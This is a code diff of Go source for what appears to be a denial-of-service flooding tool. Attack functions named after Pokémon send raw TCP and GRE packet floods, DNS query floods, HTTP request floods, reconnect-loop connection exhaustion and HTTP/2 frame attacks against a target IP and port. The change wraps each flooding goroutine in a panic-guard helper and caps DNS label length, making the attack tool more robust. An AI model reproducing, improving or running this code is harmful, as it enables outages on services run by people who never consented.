@@ -523,7 +523,7 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("alakazam", func() {
 			defer wg.Done()
 			for {
 				select {
@@ -561,7 +561,7 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 					}
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -608,7 +608,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 
 		for i := 0; i < workerPool; i++ {
 			wg.Add(1)
-			go func() {
+			guardedGo("machamp-proxy", func() {
 				defer wg.Done()
 				for {
 					select {
@@ -655,7 +655,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 						}
 						}
 				}
-			}()
+			})
 		}
 		wg.Wait()
 		return
@@ -672,7 +672,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 	methods := []string{"GET", "POST", "HEAD"}
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("machamp-direct", func() {
 			defer wg.Done()
 			for {
 				select {
@@ -720,7 +720,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 					conn.Close()
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -948,7 +948,7 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 	}
 	for i := 0; i < sessionWorkers; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("gyarados", func() {
 			defer wg.Done()
 			for {
 				select {
@@ -987,7 +987,7 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 					}
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -1037,7 +1037,7 @@ func dragonite(targetIP string, targetPort, duration int) {
 	defer cancel()
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("dragonite", func() {
 			defer wg.Done()
 			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
 			if err != nil {
@@ -1058,7 +1058,7 @@ func dragonite(targetIP string, targetPort, duration int) {
 					atomic.AddInt64(&packetCount, 1)
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -1089,7 +1089,7 @@ func tyranitar(targetIP string, targetPort int, duration int) error {
 	defer cancel()
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("tyranitar", func() {
 			defer wg.Done()
 			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
 			if err != nil {
@@ -1110,7 +1110,7 @@ func tyranitar(targetIP string, targetPort int, duration int) error {
 					atomic.AddInt64(&packetCount, 1)
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 	return nil
@@ -1141,7 +1141,7 @@ func metagross(targetIP string, duration int) error {
 	defer cancel()
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("metagross", func() {
 			defer wg.Done()
 			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
 			if err != nil {
@@ -1162,7 +1162,7 @@ func metagross(targetIP string, duration int) error {
 					atomic.AddInt64(&packetCount, 1)
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 	return nil
@@ -1172,6 +1172,9 @@ func metagross(targetIP string, duration int) error {
 func encodeDNSName(domain string) []byte {
 	var buf []byte
 	for _, label := range strings.Split(strings.TrimSuffix(domain, "."), ".") {
+		if len(label) > 63 {
+			label = label[:63]
+		}
 		buf = append(buf, byte(len(label)))
 		buf = append(buf, []byte(label)...)
 	}
@@ -1298,7 +1301,7 @@ func salamence(targetIP string, targetPort, duration int) {
 	queryTypes := []uint16{1, 28, 15, 2} // A, AAAA, MX, NS
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("salamence", func() {
 			defer wg.Done()
 			conn, err := net.ListenPacket("udp", ":0")
 			if err != nil {
@@ -1319,7 +1322,7 @@ func salamence(targetIP string, targetPort, duration int) {
 					atomic.AddInt64(&packetCount, 1)
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -1347,7 +1350,7 @@ func snorlax(targetIP string, targetPort, duration int) {
 	payload := make([]byte, 1024)
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("snorlax", func() {
 			defer wg.Done()
 			for {
 				select {
@@ -1364,7 +1367,7 @@ func snorlax(targetIP string, targetPort, duration int) {
 					conn.Close()
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -1391,7 +1394,7 @@ func gengar(targetIP string, targetPort, duration int) {
 	var wg sync.WaitGroup
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("gengar", func() {
 			defer wg.Done()
 			for {
 				select {
@@ -1408,7 +1411,7 @@ func gengar(targetIP string, targetPort, duration int) {
 					conn.Close()
 				}
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -1462,7 +1465,7 @@ func darkraiProxy(target string, targetPort, duration int, useProxy bool) {
 	var wg sync.WaitGroup
 	for i := 0; i < workerPool; i++ {
 		wg.Add(1)
-		go func() {
+		guardedGo("darkrai", func() {
 			defer wg.Done()
 			// Each worker reconnects in a loop until duration expires
 			for {
@@ -1487,7 +1490,7 @@ func darkraiProxy(target string, targetPort, duration int, useProxy bool) {
 				// Small backoff before reconnecting to avoid tight spin on failures
 				time.Sleep(50 * time.Millisecond)
 			}
-		}()
+		})
 	}
 	wg.Wait()
 }
@@ -1593,7 +1596,7 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 
 	// Background reader — consume server frames so the connection doesn't stall
 	connDone := make(chan struct{})
-	go func() {
+	guardedGo("giratina-reader", func() {
 		defer close(connDone)
 		for {
 			f, err := framer.ReadFrame()
@@ -1610,7 +1613,7 @@ func giratina(targetURL string, stop <-chan struct{}) error {
 				return // server rejected us
 			}
 		}
-	}()
+	})
 
 	// HPACK encoder for pseudo-headers
 	var hdrBuf bytes.Buffer
